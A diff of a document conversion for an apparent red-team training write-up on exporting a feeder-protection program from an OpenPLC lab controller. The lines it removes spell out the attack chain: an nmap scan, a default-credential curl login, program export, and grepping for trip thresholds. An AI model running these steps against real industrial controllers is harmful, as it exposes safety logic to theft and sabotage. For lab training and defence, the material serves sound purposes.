@@ -1,20 +1,4 @@
-﻿<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th><p><strong>OPENPLC</strong></p>
-<p><strong>Protection Logic Program Upload</strong></p>
-<p>Detailed Red Team Technical Write-Up</p>
-<p><strong>ATT&amp;CK for ICS T0845 - Program Upload</strong></p>
-<p>Release: v1.0.0-RC4 | Validation Date: 25 July 2026</p>
-<p><strong>Prepared by Hacktify Technologies</strong></p></th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+﻿[TABLE]
 
 **INTERNAL / TRAINING USE ONLY**
 
@@ -132,22 +116,7 @@ The assessment followed a progressive black-box workflow. Each stage established
 
 ## Procedure
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th>TARGET="&lt;TARGET_IP&gt;"<br />
-<br />
-sudo nmap -Pn -n -sS -sV \<br />
--p 22,80,502,8080 \<br />
-"$TARGET"</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 ## Observed Result
 
@@ -158,7 +127,7 @@ sudo nmap -Pn -n -sS -sV \<br />
 | **TCP/502** | Filtered - Modbus/TCP is not directly exposed externally |
 | **TCP/8080** | Filtered - Direct OpenPLC web interface is not externally exposed |
 
-<img src="C:\Users\uddes\Downloads\OT TTP Fixed-20260803T065237Z-1-001\OT TTP Fixed\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4-Updated-TTP-Format\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4\OpenPLC-Protection-Logic-Program-Upload-Red-vs-Blue-Module\OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image1.png" style="width:6.65in;height:3.62651in" alt="Image: image1.png" />
+<img alt="Image: image1.png" src="https://raw.githubusercontent.com/hacktify-uv/temp/main/OpenPLC-Protection-Logic-Program-Upload/OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image1.png" />
 
 *Figure 1 - External reconnaissance identified SSH and the Nginx engineering gateway, while direct OpenPLC ports remained filtered.*
 
@@ -176,41 +145,15 @@ The externally reachable attack surface was limited to SSH and HTTP. Because TCP
 
 ## Procedure
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th>TARGET="&lt;TARGET_IP&gt;"<br />
-<br />
-curl -sS -D - \<br />
-"http://$TARGET/robots.txt"</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 ## Observed Result
 
 The server returned HTTP 200 and disclosed the following path:
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th>User-agent: *<br />
-Disallow: /engineering/programs/</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
-<img src="C:\Users\uddes\Downloads\OT TTP Fixed-20260803T065237Z-1-001\OT TTP Fixed\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4-Updated-TTP-Format\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4\OpenPLC-Protection-Logic-Program-Upload-Red-vs-Blue-Module\OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image2.png" style="width:6.3in;height:4.77391in" alt="Image: image2.png" />
+<img alt="Image: image2.png" src="https://raw.githubusercontent.com/hacktify-uv/temp/main/OpenPLC-Protection-Logic-Program-Upload/OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image2.png" />
 
 *Figure 2 - The publicly accessible robots.txt file disclosed the restricted engineering-program path.*
 
@@ -228,36 +171,7 @@ The robots.txt file is intended to guide web crawlers and is not an access-contr
 
 ## Procedure
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th>TARGET="&lt;TARGET_IP&gt;"<br />
-COOKIE_JAR="$HOME/Documents/openplc.cookie"<br />
-rm -f "$COOKIE_JAR"<br />
-<br />
-# Verify unauthenticated redirect.<br />
-curl -sS -o /dev/null -w '%{http_code}' \<br />
-"http://$TARGET/engineering/programs/active"<br />
-<br />
-# Create an authenticated session.<br />
-curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" \<br />
--o /dev/null -w '%{http_code}' -X POST \<br />
---data-urlencode 'username=openplc' \<br />
---data-urlencode 'password=openplc' \<br />
-"http://$TARGET/login"<br />
-<br />
-# Confirm dashboard access.<br />
-curl -sS -b "$COOKIE_JAR" \<br />
--o /dev/null -w '%{http_code}' \<br />
-"http://$TARGET/dashboard"</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 ## Observed Result
 
@@ -268,7 +182,7 @@ curl -sS -b "$COOKIE_JAR" \<br />
 | **Authenticated dashboard** | HTTP 200 |
 | **Credentials accepted** | openplc / openplc |
 
-<img src="C:\Users\uddes\Downloads\OT TTP Fixed-20260803T065237Z-1-001\OT TTP Fixed\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4-Updated-TTP-Format\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4\OpenPLC-Protection-Logic-Program-Upload-Red-vs-Blue-Module\OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image3.png" style="width:6.2in;height:2.42609in" alt="Image: image3.png" />
+<img alt="Image: image3.png" src="https://raw.githubusercontent.com/hacktify-uv/temp/main/OpenPLC-Protection-Logic-Program-Upload/OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image3.png" />
 
 *Figure 3 - The engineering area required authentication, but the intentionally weak openplc/openplc credentials created a valid session.*
 
@@ -286,26 +200,7 @@ The engineering path was not anonymously accessible; however, the intentionally 
 
 ## Procedure
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th>ACTIVE_PAGE="$HOME/Documents/openplc-active-project.html"<br />
-<br />
-curl -sS -b "$COOKIE_JAR" \<br />
--o "$ACTIVE_PAGE" \<br />
-"http://$TARGET/engineering/programs/active"<br />
-<br />
-sed -n \<br />
-'s/.*Project file:[[:space:]]*&lt;strong&gt;\([^&lt;]*\)&lt;\/strong&gt;.*/\1/p' \<br />
-"$ACTIVE_PAGE" | head -n 1</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 ## Observed Result
 
@@ -314,7 +209,7 @@ sed -n \<br />
 | **Active-project page**       | HTTP 200             |
 | **Active controller project** | feeder_protection.st |
 
-<img src="C:\Users\uddes\Downloads\OT TTP Fixed-20260803T065237Z-1-001\OT TTP Fixed\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4-Updated-TTP-Format\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4\OpenPLC-Protection-Logic-Program-Upload-Red-vs-Blue-Module\OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image4.png" style="width:6.15in;height:1.89874in" alt="Image: image4.png" />
+<img alt="Image: image4.png" src="https://raw.githubusercontent.com/hacktify-uv/temp/main/OpenPLC-Protection-Logic-Program-Upload/OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image4.png" />
 
 *Figure 4 - The authenticated active-project page identified feeder_protection.st as the running controller project.*
 
@@ -332,38 +227,7 @@ Identifying the active filename ensured that the subsequent export targeted the 
 
 ## Procedure
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th>HEADERS="$HOME/Documents/transfer.headers"<br />
-PROGRAM="$HOME/Documents/feeder_protection.st"<br />
-<br />
-# Refresh the session immediately before export.<br />
-curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" \<br />
--o /dev/null -X POST \<br />
---data-urlencode 'username=openplc' \<br />
---data-urlencode 'password=openplc' \<br />
-"http://$TARGET/login"<br />
-<br />
-# Upload the active program from controller to client.<br />
-curl -sS -A 'OpenPLC-Red-Writeup/1.0' \<br />
--c "$COOKIE_JAR" -b "$COOKIE_JAR" \<br />
--D "$HEADERS" -o "$PROGRAM" \<br />
-"http://$TARGET/engineering/programs/active/export"<br />
-<br />
-sha256sum "$PROGRAM"<br />
-stat -c '%s' "$PROGRAM"<br />
-grep -Ei \<br />
-'x-openplc-transfer-direction|x-openplc-program-sha256' \<br />
-"$HEADERS"</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 ## Observed Result
 
@@ -376,7 +240,7 @@ grep -Ei \<br />
 | **Controller-provided SHA-256** | 0a228f264d7946612b864f73b0718d1c8c696fdc6e8a94df6a2a048ab5381ce2 |
 | **Downloaded-file SHA-256** | 0a228f264d7946612b864f73b0718d1c8c696fdc6e8a94df6a2a048ab5381ce2 |
 
-<img src="C:\Users\uddes\Downloads\OT TTP Fixed-20260803T065237Z-1-001\OT TTP Fixed\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4-Updated-TTP-Format\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4\OpenPLC-Protection-Logic-Program-Upload-Red-vs-Blue-Module\OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image5.png" style="width:6.65in;height:2.55305in" alt="Image: image5.png" />
+<img alt="Image: image5.png" src="https://raw.githubusercontent.com/hacktify-uv/temp/main/OpenPLC-Protection-Logic-Program-Upload/OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image5.png" />
 
 *Figure 5 - A fresh authenticated session exported the 3,201-byte active program, and the downloaded SHA-256 matched the controller-provided value.*
 
@@ -394,23 +258,7 @@ The matching hashes establish that the downloaded artifact was complete and unch
 
 ## Procedure
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th>grep -nE \<br />
-'UNDERVOLTAGE_TRIP_THRESHOLD_V[[:space:]]*:|\<br />
-OVERCURRENT_TRIP_THRESHOLD_A[[:space:]]*:|\<br />
-TRIP_LATCH[[:space:]]*:|\<br />
-BREAKER_CLOSE_PERMISSIVE[[:space:]]*:' \<br />
-feeder_protection.st</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 ## Observed Result
 
@@ -421,7 +269,7 @@ feeder_protection.st</th>
 | **Breaker-close permissive variable** | BREAKER_CLOSE_PERMISSIVE |
 | **Protection trip-latch variable**    | TRIP_LATCH               |
 
-<img src="C:\Users\uddes\Downloads\OT TTP Fixed-20260803T065237Z-1-001\OT TTP Fixed\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4-Updated-TTP-Format\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4\OpenPLC-Protection-Logic-Program-Upload-Red-vs-Blue-Module\OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image6.png" style="width:6.35in;height:3.75772in" alt="Image: image6.png" />
+<img alt="Image: image6.png" src="https://raw.githubusercontent.com/hacktify-uv/temp/main/OpenPLC-Protection-Logic-Program-Upload/OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image6.png" />
 
 *Figure 6 - Static analysis of feeder_protection.st identified the required thresholds and control variables.*
 
@@ -439,20 +287,7 @@ The program defines an undervoltage trip threshold of 9,000 V and an overcurrent
 
 ## Procedure
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th># Run on the OpenPLC validation server after the Red export.<br />
-/opt/openplc-challenge/bin/service-check-functional.sh<br />
-/opt/openplc-challenge/bin/service-check.sh</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 ## Observed Result
 
@@ -471,7 +306,7 @@ The program defines an undervoltage trip threshold of 9,000 V and an overcurrent
 | **Security-aware status** | SERVICE_STATUS:DOWN \| SYSTEMD:UP \| PORTS:UP \| PROBES:UP \| SECURITY:DOWN |
 | **Security-aware exit code** | 1 |
 
-<img src="C:\Users\uddes\Downloads\OT TTP Fixed-20260803T065237Z-1-001\OT TTP Fixed\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4-Updated-TTP-Format\OpenPLC-Protection-Logic-Program-Upload-v1.0.0-RC4\OpenPLC-Protection-Logic-Program-Upload-Red-vs-Blue-Module\OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image7.png" style="width:6.65in;height:3.44436in" alt="Image: image7.png" />
+<img alt="Image: image7.png" src="https://raw.githubusercontent.com/hacktify-uv/temp/main/OpenPLC-Protection-Logic-Program-Upload/OpenPLC-Protection-Logic-Program-Upload-Red-Team-Detailed-Writeup-assets/media/image7.png" />
 
 *Figure 7 - The export generated PROGRAM_UPLOAD_FROM_PLC and changed the security-aware state to DOWN while all functional vectors remained UP.*
 
@@ -577,49 +412,7 @@ The post-collection validation confirmed that the environment remained functiona
 
 # Appendix B - Condensed Command Summary
 
-<table>
-<colgroup>
-<col style="width: 100%" />
-</colgroup>
-<thead>
-<tr>
-<th># 1. Reconnaissance<br />
-sudo nmap -Pn -n -sS -sV -p 22,80,502,8080 &lt;TARGET_IP&gt;<br />
-<br />
-# 2. Engineering path discovery<br />
-curl -sS -D - http://&lt;TARGET_IP&gt;/robots.txt<br />
-<br />
-# 3. Authenticate<br />
-curl -sS -c openplc.cookie -b openplc.cookie -X POST \<br />
---data-urlencode 'username=openplc' \<br />
---data-urlencode 'password=openplc' \<br />
-http://&lt;TARGET_IP&gt;/login<br />
-<br />
-# 4. Identify active project<br />
-curl -sS -b openplc.cookie \<br />
-http://&lt;TARGET_IP&gt;/engineering/programs/active<br />
-<br />
-# 5. Export active program<br />
-curl -sS -A 'OpenPLC-Red-Writeup/1.0' \<br />
--b openplc.cookie -D transfer.headers \<br />
--o feeder_protection.st \<br />
-http://&lt;TARGET_IP&gt;/engineering/programs/active/export<br />
-<br />
-# 6. Verify and analyze<br />
-sha256sum feeder_protection.st<br />
-grep -nE \<br />
-'UNDERVOLTAGE_TRIP_THRESHOLD_V|OVERCURRENT_TRIP_THRESHOLD_A|\<br />
-BREAKER_CLOSE_PERMISSIVE|TRIP_LATCH' \<br />
-feeder_protection.st<br />
-<br />
-# 7. Validate security impact on the target<br />
-/opt/openplc-challenge/bin/service-check-functional.sh<br />
-/opt/openplc-challenge/bin/service-check.sh</th>
-</tr>
-</thead>
-<tbody>
-</tbody>
-</table>
+[TABLE]
 
 # Appendix C - Screenshot Evidence Index
 
